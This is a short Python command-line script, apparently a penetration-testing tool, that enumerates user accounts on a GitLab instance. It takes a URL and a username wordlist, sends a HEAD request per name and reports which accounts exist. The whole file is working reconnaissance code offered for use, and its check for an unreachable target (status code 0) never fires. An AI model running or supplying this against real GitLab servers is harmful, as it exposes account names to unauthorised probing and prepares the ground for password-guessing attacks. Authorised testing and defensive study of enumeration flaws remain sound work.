#!/usr/bin/env python3

import requests
import argparse

def main():
    parser = argparse.ArgumentParser(description='GitLab User Enumeration')
    parser.add_argument('--url', '-u', type=str, required=True, help='The URL of the GitLab\'s instance')
    parser.add_argument('--wordlist', '-w', type=str, required=True, help='Path to the username wordlist')
    args = parser.parse_args()

    print('GitLab User Enumeration in python')

    with open(args.wordlist, 'r') as f:
        for line in f:
            username = line.strip()
            http_code = requests.head(f'{args.url}/{username}').status_code
            print(f'[-] Checking {username}')
            if http_code == 200:
                print(f'[+] The username {username} exists!')
            elif http_code == 0:
                print('[!] The target is unreachable.')
                break
        print('End reached')

if __name__ == '__main__':
    main()